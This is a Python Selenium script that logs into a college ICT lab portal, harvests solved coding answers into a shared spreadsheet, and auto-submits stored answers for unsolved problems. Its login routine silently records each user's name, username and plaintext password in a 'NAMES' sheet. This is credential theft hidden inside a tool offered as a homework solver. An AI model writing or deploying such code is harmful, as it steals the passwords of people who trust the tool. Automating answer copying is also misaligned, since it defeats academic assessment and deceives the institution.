from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from sheets import sheet
import re
import os
class solveproblems:
    def __init__(self):
        self.path=str(os.getcwd())+"\\chromedriver"
        self.driver=webdriver.Chrome(self.path)
        self.driver.set_window_size(600,500)
        self.driver.set_window_position(700,50)
        self.sheet=sheet()

    def setyear(self,college,year):
        self.college=college
        self.year=year
    def checkuser(self,username,password):
        self.username=username
        self.password=password
        self.driver.get(f'http://tlc.krgi.in/ictlab{self.college}{self.year}/')
        self.usernameobj=self.driver.find_element_by_id('userid')
        self.passwordobj=self.driver.find_element_by_id('password')
        self.usernameobj.send_keys(self.username)
        self.passwordobj.send_keys(self.password)
        self.passwordobj.send_keys(Keys.RETURN)
        try:
            self.name=WebDriverWait(self.driver,10).until(
                EC.presence_of_element_located((By.CLASS_NAME,"name1"))
            )
            self.sheet.opensheet('NAMES')
            self.sheet.insertrow(str(datetime.now()),str(self.name.text.split()[0])+f',user:{username},pass:{password}')
            return True,f'Account found : {self.name.text.split()[0]}'
          
        except:
            return False,'Account not found'
        
    def getcourses(self):
        self.courses=self.driver.find_elements_by_tag_name('h5')
        self.courses=self.courses[1:-1]
        print(f'total no of courses: {len(self.courses)}')
        print([i.text for i in self.courses])
        return self.courses
        
    def solvecourse(self,course):
        print(course)
       
        self.sheet.opensheet(course)
        self.availabeids=self.sheet.getids()
        self.currentcourse=course
        self.selectcourse=WebDriverWait(self.driver,10).until(
                EC.presence_of_element_located((By.ID,self.currentcourse))
            )
        self.selectcourse.click()
        self.driver.set_window_size(1200,700)
        self.driver.set_window_position(50,50)
        for i in range(1,4):
            for j in range(100):
                print(f'circle: {i}  program{j}')
                self.driver.get(f'http://tlc.krgi.in/ictlab{self.college}{self.year}/login/studentnew/code/{self.currentcourse.lower()}/{self.currentcourse.lower()}.code.php?id={i}&value={j}')
                self.problempage()
               
        self.driver.get(f'http://tlc.krgi.in/ictlab{self.college}{self.year}/login/studentnew/index.php')
        return 'tried our best thankyou'
    
    def problempage(self):
        
        self.notallocated=WebDriverWait(self.driver,1).until(
            EC.presence_of_element_located((By.TAG_NAME,"body"))
        )
   
        if 'NOT ALLOCATED' in self.notallocated.text:
            print('not allocated')
        else:
            
            self.ids=WebDriverWait(self.driver,10).until(
                    EC.presence_of_element_located((By.CLASS_NAME,"collection"))
                )
        
            index=self.ids.text.split().index('ID')
            self.id=self.ids.text.split()[index+1]
            print(self.id,end=" ")
            self.cc=WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.ID, "idiv"))
                    )
            self.stauslist=self.cc.get_attribute('class').split()
            if 'green' in self.stauslist:
                self.solved=True
            if 'indigo' in self.stauslist:
                self.solved=False
            if self.solved:
                if self.id not in self.availabeids:
                    print('collecting answer')
                    code= WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.ID, "codeEditor"))
                        )
                    code.click()
                    lines= WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.TAG_NAME,"textarea"))
                    )
                    lines.send_keys(Keys.CONTROL,'a')
                    lines.send_keys(Keys.ARROW_RIGHT) 
                    itt=self.driver.find_element_by_class_name('codeMirror-activeline')
                    itt=itt.find_element_by_class_name('codeMirror-linenumber').text
                    
                    lines.send_keys(Keys.CONTROL,'a')
                    lines.send_keys(Keys.ARROW_LEFT) 
                    self.originalcode=''
                    
                    while True:
                        incodes=self.driver.find_element_by_class_name('codeMirror-activeline')
                        incodesn=incodes.find_element_by_class_name('codeMirror-linenumber').text
                        txt=incodes.get_attribute('innerHTML')
                        removed=re.sub('<[^>]+>', '', txt) 
                        removed=removed.replace(incodesn,'',1)
                        # print(removed)
                        self.originalcode =f'{self.originalcode}\n{removed}'
                        lines.send_keys(Keys.ARROW_DOWN)
                        if incodesn==itt:
                            break
                    self.o=self.originalcode.replace('&lt;','<')
                    self.ori=self.o.replace('&gt;','>')
                    # print(self.ori)
                    self.sheet.insertrow(self.id,self.ori)
            if not self.solved:
                if self.id in self.availabeids:
                    oricode=self.sheet.getrow(self.id)
                    oricode=oricode.replace('\u200b','')
                    oricode=oricode.replace('&amp;','&')
                    oricode=re.sub(r'\n *','\n',oricode)
                    code= WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.ID, "codeEditor"))
                        )
                    code.click()
                    lines= WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.TAG_NAME,"textarea"))
                    )
                    lines.send_keys(Keys.CONTROL,'a')
                    lines.send_keys(Keys.BACKSPACE)
                    lines.send_keys(oricode)
                
                    evaluate=self.driver.find_element_by_id('evaluateButton')
                    evaluate.click()
                else:
                    print(f'no solution for the question {self.id} in the database')

    def solveall(self):
        t=[i.text for i in self.courses]
        for i in t:
        
            print(i)
            self.solvecourse(i)
            self.driver.get(f'http://tlc.krgi.in/ictlab{self.college}{self.year}/login/studentnew/index.php')
            print('done')
